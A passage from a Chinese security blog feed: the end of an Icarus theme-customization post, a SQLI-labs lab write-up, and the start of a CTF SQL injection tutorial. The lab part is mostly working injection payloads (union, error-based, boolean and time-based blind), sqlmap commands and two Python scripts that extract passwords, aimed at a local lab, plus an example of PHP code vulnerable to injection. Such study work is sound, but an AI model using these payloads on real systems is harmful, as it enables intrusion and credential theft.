href="#增加标题自动计数" class="headerlink" title="增加标题自动计数"></a>增加标题自动计数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line"></span><br><span class="line">+.article &#123;counter-reset:section&#125;</span><br><span class="line">+.article h2&#123;counter-reset:sub-section&#125;</span><br><span class="line">+.article h3&#123;counter-reset:composite&#125;</span><br><span class="line">+.article h4&#123;counter-reset:detail&#125;</span><br><span class="line">+.article h2:before&#123;content:counter(section) &quot; &quot;;counter-increment:section&#125;</span><br><span class="line">+.article h3:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot; &quot;;counter-increment:sub-section&#125;</span><br><span class="line">+.article h4:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot;.&quot; counter(composite) &quot; &quot;;counter-increment:composite&#125;</span><br></pre></td></tr></table></figure><h3 id="默认显示目录"><a href="#默认显示目录" class="headerlink" title="默认显示目录"></a>默认显示目录</h3><p>新版支持直接配置，在<code>_config.yml</code>增加<code>toc: true</code>即可。</p><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="card-增加浮动效果"><a href="#card-增加浮动效果" class="headerlink" title="card 增加浮动效果"></a>card 增加浮动效果</h3><p><code>:hover</code> 时增大阴影，并增加动画属性 <code>ease-in-out</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;card.styl</span><br><span class="line"></span><br><span class="line"> .card</span><br><span class="line">     overflow: visible</span><br><span class="line">     border-radius: $card-radius</span><br><span class="line">+    &amp;:hover</span><br><span class="line">+        box-shadow: 0 6px 15px rgba(0,0,0,0.15), 0 0 1px rgba(0,0,0,0.1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">     setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">         $(&#39;body &gt; .navbar, body &gt; .section, body &gt; .footer&#39;).forEach(element &#x3D;&gt; &#123;</span><br><span class="line">             element.style.opacity &#x3D; &#39;1&#39;;</span><br><span class="line">-            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">         &#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">                     element.style.transform &#x3D; &#39;&#39;;</span><br><span class="line">-                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">                 &#125;, i * 100);</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><code>2020-12-04</code> 基于 <a href="https://github.com/ppoffice/hexo-theme-icarus/releases/tag/4.1.1">4.1.1</a> 版本重新改动。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只列举了部分改动，详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.alphalxy.com/2019/03/customize-icarus/">https://www.alphalxy.com/2019/03/customize-icarus/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文是基于icarus 4.x的版本&lt;/p&gt;
&lt;p&gt;本博客所选取的主题是 &lt;a href=&quot;https://github.com/AlphaLxy/hexo-theme-icarus&quot;&gt;Icarus&lt;/a&gt; ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以
      
    
    </summary>
    
    
      <category term="环境配置" scheme="http://www.ol4three.com/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="icarus" scheme="http://www.ol4three.com/tags/icarus/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场学习记录</title>
    <link href="http://www.ol4three.com/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.ol4three.com/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-12-23T02:15:15.000Z</published>
    <updated>2021-01-07T06:19:35.554Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础挑战1-20关"><a href="#基础挑战1-20关" class="headerlink" title="基础挑战1-20关"></a>基础挑战1-20关</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3%23    &#x2F;&#x2F;得到列数为3</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23  &#x2F;&#x2F;得到数据库名</span><br><span class="line">-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D; &#39;security&#39;%23 &#x2F;&#x2F;得到表名</span><br><span class="line">-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D; &#39;users&#39;%23 &#x2F;&#x2F;得到列名</span><br><span class="line">-1&#39; union select 1,username,password from users where id&#x3D;3%23 &#x2F;&#x2F;爆破得到数据</span><br></pre></td></tr></table></figure><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h3 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure><h3 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+</span><br><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+</span><br></pre></td></tr></table></figure><p>延时盲注</p><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p><strong>联合查询注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>在添加’后返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>和less1一样 payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>添加’后返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>所以我们需要闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1%27)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>添加’后为报错添加”后报错如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;-1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1&quot;)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>尝试发现报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>推测为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;&#39;input&#39; LIMIT 0,1;</span><br></pre></td></tr></table></figure><p>sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br></pre></td></tr></table></figure><p>尝试之前的方法不会返回我们注入的信息，如果注入成功，会返回<code>Your are in...</code>，出错的话就不会返回字符串，所以这里我们可以考虑</p><ul><li>盲注</li><li>延时注入</li><li>报错注入</li></ul><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="Left"><a href="#Left" class="headerlink" title="Left()"></a>Left()</h4><p>例如我们可以使用<code>1&#39; and left(version(),1)=3%23</code>这个payload进行测试，截取<code>version()</code>得到的最左侧的字符判断是否为3，如果为3则正常返回<code>You are in...</code>，否则不返回。所以我们可以利用这个一步一步爆破得到<code>left(version(),1)=5</code>。爆破区间可以确定在<code>/[0-9.]/</code>。</p><p>采用<code>1&#39;and length(database())=8%23</code>对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用<code>database()</code>来进行爆破数据库名，采用<code>left(database(),1)&gt;&#39;a&#39;</code>这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。</p><h4 id="substr-、acsii"><a href="#substr-、acsii" class="headerlink" title="substr()、acsii()"></a>substr()、acsii()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;80%23     &#x2F;&#x2F;截取数据库下第一个表的第一个字符与80ascii值进行对比</span><br><span class="line"></span><br><span class="line">找第二个字符只需要改成substr(&#39;xxx&#39;,2,1)即可。</span><br><span class="line">找第二个表改成limit 1,1</span><br></pre></td></tr></table></figure><h4 id="使用regexp"><a href="#使用regexp" class="headerlink" title="使用regexp()"></a>使用regexp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1;)%23</span><br><span class="line">&#x2F;&#x2F;users表中的列名是否有us**的列</span><br></pre></td></tr></table></figure><h4 id="使用ord-、mid"><a href="#使用ord-、mid" class="headerlink" title="使用ord()、mid()"></a>使用ord()、mid()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68%23</span><br><span class="line">&#x2F;&#x2F;cast(username AS CHAR)将username转换成字符串</span><br><span class="line">&#x2F;&#x2F;IFNULL(exp1,exp2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">url_paylaod &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; %23&quot;</span><br><span class="line">chars &#x3D; &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%&#x2F;^!~&quot;</span><br><span class="line">result_length &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length((&#123;0&#125;)) &gt;&#123;1&#125; %23&quot;</span><br><span class="line"></span><br><span class="line">def get_result_length(payload, value):</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        url &#x3D; result_length.format(payload, i)</span><br><span class="line">        response &#x3D; requests.get(url)</span><br><span class="line">        if len(response.text) &gt; value:</span><br><span class="line">            print(&#39;-----length is :%s&#39; % str(i))</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">def get_result(result_length, payload, value):</span><br><span class="line">    for i in range(1, result_length):</span><br><span class="line">        for char in chars:</span><br><span class="line">            url &#x3D; url_paylaod.format(payload, i, ord(char))</span><br><span class="line">            response &#x3D; requests.get(url)</span><br><span class="line">            if len(response.text) &gt; value:</span><br><span class="line">                global result</span><br><span class="line">                result +&#x3D; char</span><br><span class="line">                print(&#39;----- data is :%s&#39; % result)</span><br><span class="line">                break</span><br><span class="line">payload &#x3D; &quot;select password from users where id&#x3D;3 &quot;</span><br><span class="line">value &#x3D; 710</span><br><span class="line">get_result(get_result_length(payload, value), payload, value)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>推荐一篇超详细的讲解报错注入的文章——<a href="https://www.cnblogs.com/xdans/p/5412468.html">Mysql报错注入原理分析(count()、rand()、group by)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0</span><br><span class="line">x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line"></span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span><br><span class="line"></span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">1&#39; union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line"></span><br><span class="line">1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1--+</span><br></pre></td></tr></table></figure><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">value &#x3D;&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br><span class="line">data&#x3D;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((ascii(substr((&#123;0&#125; limit 1,1),&#123;1&#125;,1)) &#x3D; &#39;&#123;2&#125;&#39;),sleep(3),NULL); %23&quot;</span><br><span class="line">url_length&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((length((&#123;0&#125; limit 1,1))&#x3D;&#123;1&#125; ),sleep(3),NULL); %23&quot;</span><br><span class="line">def get_length(payload):</span><br><span class="line">    for n in range(1,100):</span><br><span class="line">        url&#x3D; url_length.format(payload,n)</span><br><span class="line">        #print(url)</span><br><span class="line">        if(get_respone(url)):</span><br><span class="line">            print(&quot;[+] length is &#123;0&#125;&quot;.format(n))</span><br><span class="line">            return n</span><br><span class="line">def get_data(payload,value,length):</span><br><span class="line">    for n in range(1,length):</span><br><span class="line">        for v in value :</span><br><span class="line">            url_data &#x3D; url.format(payload,n,ord(v))</span><br><span class="line">            #print(url_data)</span><br><span class="line">            if(get_respone(url_data)):</span><br><span class="line">                global data</span><br><span class="line">                data&#x3D;data+v</span><br><span class="line">                print(&quot;[+] data is &#123;0&#125;&quot;.format(data))</span><br><span class="line">                break</span><br><span class="line">def get_respone(url):</span><br><span class="line">    try:</span><br><span class="line">        html &#x3D; requests.get(url,timeout&#x3D;2)</span><br><span class="line">        return False</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;......&quot;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">databse_payload &#x3D;&quot;select user()&quot;</span><br><span class="line">get_data(databse_payload,value,get_length(databse_payload)+1)</span><br></pre></td></tr></table></figure><p>更新中…</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111</a></p><p><a href="http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/">http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础挑战1-20关&quot;&gt;&lt;a href=&quot;#基础挑战1-20关&quot; class=&quot;headerlink&quot; title=&quot;基础挑战1-20关&quot;&gt;&lt;/a&gt;基础挑战1-20关&lt;/h1&gt;&lt;h2 id=&quot;less-1&quot;&gt;&lt;a href=&quot;#less-1&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQLI-labs" scheme="http://www.ol4three.com/tags/SQLI-labs/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-CTF</title>
    <link href="http://www.ol4three.com/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/"/>
    <id>http://www.ol4three.com/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/</id>
    <published>2020-12-22T14:38:25.000Z</published>
    <updated>2020-12-25T17:49:55.746Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote><p>SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如Cookies，UserAgent等）与SQL语句进行拼接，造成待执行的SQL语句可控，从而使我们可以执行任意SQL语句</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-可回显的注入"><a href="#1-可回显的注入" class="headerlink" title="1.可回显的注入"></a>1.可回显的注入</h3><ul><li>可以联合查询的注入</li><li>报错注入</li><li>通过注入进行DNS请求，从而到达可回显的目的</li></ul><h3 id="2-不可回显的注入"><a href="#2-不可回显的注入" class="headerlink" title="2.不可回显的注入"></a>2.不可回显的注入</h3><ul><li>Bool盲注</li><li>时间盲注</li></ul><h3 id="3-二次注入"><a href="#3-二次注入" class="headerlink" title="3.二次注入"></a>3.二次注入</h3><p>通常作为一种业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入。</p><p>在一般的CTF比赛中，出题人都会变相地增加一层WAF</p><h2 id="可以联合查询的SQL注入"><a href="#可以联合查询的SQL注入" class="headerlink" title="可以联合查询的SQL注入"></a>可以联合查询的SQL注入</h2><p>在可以联合查询的题目中，一般会将数据库查询的数据回显到页面中，比如下面这个例子(测试样例代码时需要关闭GPC)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">  $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$getid = <span class="string">&quot;SELECT Id FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span></span><br><span class="line">$result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="string">&#x27;&lt;/pre&#x27;</span>)</span><br><span class="line">$num = mysql_numrows($result);</span><br></pre></td></tr></table></figure><p>$id变量会将GET获取到的参数直接拼接到SQL语句中，假如传入如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;union+select+1--+</span><br></pre></td></tr></table></figure><p>拼接后SQL语句就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Id FROM users WHERE user_id&#x3D;&#39;-1&#39;union select 1 --&#39;&#39;</span><br></pre></td></tr></table></figure><p>闭合前面的单引号，注释后面的单引号，中间写上需要的Payload就可以了</p><h2 id="报错注入"><a href="#报错注入" 